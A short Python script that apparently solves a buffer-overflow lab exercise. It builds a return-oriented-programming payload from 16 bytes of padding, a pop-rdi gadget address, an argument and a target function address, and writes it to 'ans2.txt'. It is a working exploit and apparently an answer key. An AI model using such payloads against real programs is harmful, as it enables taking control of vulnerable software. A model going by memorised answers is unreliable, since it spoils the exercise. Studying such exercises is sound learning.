import struct
def p64(val): return struct.pack('<Q', val)
padding = b'A' * 16
pop_rdi = 0x4012c7
func2   = 0x401216
arg     = 0x3f8
payload = padding + p64(pop_rdi) + p64(arg) + p64(func2)
with open("ans2.txt", "wb") as f:
    f.write(payload)
